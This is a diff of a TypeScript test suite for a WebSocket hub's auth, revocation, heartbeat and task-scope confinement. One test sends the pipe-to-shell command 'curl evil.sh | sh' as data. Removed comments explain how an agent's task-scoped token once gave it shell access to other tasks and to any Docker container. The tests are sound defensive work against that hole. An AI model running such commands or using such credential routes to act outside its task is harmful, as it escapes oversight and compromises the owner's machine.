@@ -12,7 +12,7 @@ import { _resetWsHub, attachWsHub, disposeWsHub, registerWsChannelHandler, setSt
 // upgrade auth (device bearer / internal-token / host), per-connection seq,
 // revocation (immediate and by sweep), deterministic replay-before-live ordering on attach, input
 // routing, detach, and status broadcast. Drives a real `ws` client against a real http.Server with
-// the hub attached — no Electron, no GUI.
+// the hub attached. No Electron, no GUI.
 
 const INTERNAL = 'internal-token-xyz'
 const DEVICE_TOKEN = 'acorn_dt_stub'
@@ -116,8 +116,8 @@ describe('wsHub auth', () => {
     await expect(open({ ...authHeaders(), host: 'evil.example.com' })).rejects.toThrow()
   })
 
-  // docs/api-reference.md § Events: the socket is token-authenticated at upgrade. No cookie and no
-  // Origin — a broker socket from Electron main is not a browser socket, and there is no ambient
+  // docs/api-reference.md § Events: the socket is token-authenticated at upgrade. No cookie, no
+  // Origin: a broker socket from Electron main is not a browser socket, and there is no ambient
   // credential left for an Origin check to defend.
   it('accepts a device bearer, and does not care what Origin says', async () => {
     const ws = await open({ ...authHeaders(), origin: 'http://evil.example.com' })
@@ -174,7 +174,7 @@ describe('wsHub seq and revocation', () => {
   it('closes a live socket the moment its device is revoked', async () => {
     const ws = await open({ host, authorization: `Bearer ${DEVICE_TOKEN}` })
     const gone = closed(ws)
-    // Fire only the revocation signal and leave isActive() true, so a close can ONLY have come from
+    // Fire only the revocation signal and leave isActive() true, so a close can only have come from
     // the onRevoked listener. Revoking for real here would leave the 20ms sweep as an alternative
     // explanation, and the two paths are separately load-bearing.
     for (const listener of revokedListeners) listener('d1')
@@ -207,9 +207,10 @@ describe('wsHub seq and revocation', () => {
 
 describe('wsHub heartbeat', () => {
   it('terminates a socket whose peer stops answering pings', async () => {
-    // `autoPong: false` is what makes this test possible AND what makes it honest: a `ws` client answers
-    // pings inside the library, below any application code, so a socket that has genuinely gone away is
-    // indistinguishable in a test from one that has not — unless the client is told to stay silent.
+    // `autoPong: false` is what makes this test possible and what makes it honest: a `ws` client
+    // answers pings inside the library, below any application code, so a socket that has genuinely
+    // gone away is indistinguishable in a test from one that has not, unless the client is told to
+    // stay silent.
     const ws = new WebSocket(`ws://${host}${WS_PATH}`, { headers: authHeaders(), autoPong: false })
     await new Promise((resolve, reject) => {
       ws.on('open', resolve)
@@ -222,9 +223,9 @@ describe('wsHub heartbeat', () => {
   it('leaves a socket alone for as long as it keeps answering', async () => {
     const ws = await open(authHeaders())
     const got = frames(ws)
-    // Long enough for several sweeps at 20ms, so "still open" means the heartbeat looked at it and let it
-    // be, not that the timer had not fired yet. Without that, a heartbeat that terminated EVERY socket
-    // would pass this case.
+    // Long enough for several sweeps at 20ms, so "still open" means the heartbeat looked at it and let
+    // it be, not that the timer had not fired yet. Without that, a heartbeat that terminated every
+    // socket would pass this case.
     await new Promise((resolve) => setTimeout(resolve, 200))
     expect(ws.readyState).toBe(WebSocket.OPEN)
     wsBroadcast({ channel: 'term:status' })
@@ -250,8 +251,8 @@ describe('wsHub streaming', () => {
     const ws = await open(authHeaders())
     const got = frames(ws)
     ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
-    // Load-bearing: LIVE must be pushed only after ready+SCREEN have been delivered, or the ordering
-    // assertion below proves nothing.
+    // Load-bearing: LIVE must be pushed only after ready and SCREEN have been delivered, or the
+    // ordering assertion below proves nothing.
     await waitFor(() => got.length >= 2, 'ready + initial screen')
     liveSink!({ type: 'output', data: 'LIVE' } satisfies ServerMsg)
     await waitFor(() => got.length >= 3, 'the live frame')
@@ -322,14 +323,8 @@ describe('wsHub streaming', () => {
   })
 })
 
-// A task-scoped internal credential is confined to its OWN task's streams.
-//
-// This is the hole an adversarial review found and confirmed by probe: authorize() verified the token
-// and returned its claims, but onConnect built the Conn without them, so the claims were discarded at
-// the door and the term:* branch routed purely by session id. An agent holds ACORN_API_TOKEN,
-// ACORN_DATA_DIR (→ node.json → port) and NODE_EXTRA_CA_CERTS, so it can open this socket itself —
-// which made it arbitrary command execution as the owner inside any OTHER task's shell, and read
-// access to every task's terminal output. Exactly what scoping the token was meant to prevent.
+// A task-scoped internal credential is confined to its own task's streams
+// (docs/security.md § Transport and auth, on the finding this test guards against).
 describe('wsHub task scope', () => {
   const streamHandlers = (seen: string[]) => ({
     input: (id: string, data: string) => void seen.push(`input:${id}:${data}`),
@@ -359,7 +354,7 @@ describe('wsHub task scope', () => {
     const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
     ws.send(JSON.stringify({ channel: 'term:input', id: 's2', data: 'curl evil.sh | sh\n' }))
     ws.send(JSON.stringify({ channel: 'term:attach', id: 's2' }))
-    // Unknown ids fail CLOSED for a task-scoped caller: failing open would make the check bypassable
+    // Unknown ids fail closed for a task-scoped caller: failing open would make the check bypassable
     // by racing session creation.
     ws.send(JSON.stringify({ channel: 'term:attach', id: 'never-existed' }))
     // Then a frame that IS allowed, so the assertion cannot pass merely because nothing was processed.
@@ -384,13 +379,8 @@ describe('wsHub task scope', () => {
   })
 })
 
-// The second half of the same hole, found by the same review: the scope check above lived INSIDE the
-// `term:` branch, so every OTHER channel — and every broadcast — was unchecked.
-//
-// The generic dispatch mattered most because of what is on the other side of it:
-// plugins/docker's handler answers `docker:exec:open` by spawning `docker exec -it <ref> sh -c 'exec
-// bash'` and pipes `docker:exec:in` into it. A task-scoped credential therefore had an interactive shell
-// in any container on the machine, from a socket it can open itself.
+// The second half of the same finding: the scope check used to live inside the `term:` branch, so
+// every other channel, and every broadcast, was unchecked (docs/security.md § Transport and auth).
 describe('wsHub non-term channels and broadcast, under task scope', () => {
   const taskToken = () => mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' })
 
@@ -418,8 +408,8 @@ describe('wsHub non-term channels and broadcast, under task scope', () => {
     confined.close()
     await closed(confined)
 
-    // A control on a SECOND socket, so the assertion cannot pass merely because nothing was processed at
-    // all: the same three frames from an unconfined socket must reach the handler.
+    // A control on a second socket, so the assertion cannot pass merely because nothing was processed
+    // at all: the same three frames from an unconfined socket must reach the handler.
     const device = await open(authHeaders())
     device.send(JSON.stringify({ channel: 'docker:exec:open', execId: 'e1', ref: 'deadbeef', cols: 80, rows: 24 }))
     await waitFor(() => seen.length > 0, 'the control socket to reach the handler')
@@ -443,8 +433,8 @@ describe('wsHub non-term channels and broadcast, under task scope', () => {
     device.close()
   })
 
-  // No broadcast frame is task-addressed, so a confined socket gets none of them. workflow:step:event is
-  // the one that hurts — it is another task's raw agent stream, assistant text and tool results included.
+  // No broadcast frame is task-addressed, so a confined socket gets none of them
+  // (docs/security.md § Transport and auth).
   it('does not fan any broadcast to a task-scoped socket, while an unconfined socket still gets them', async () => {
     const confined = await open({ host, 'x-acorn-internal': taskToken() })
     const service = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
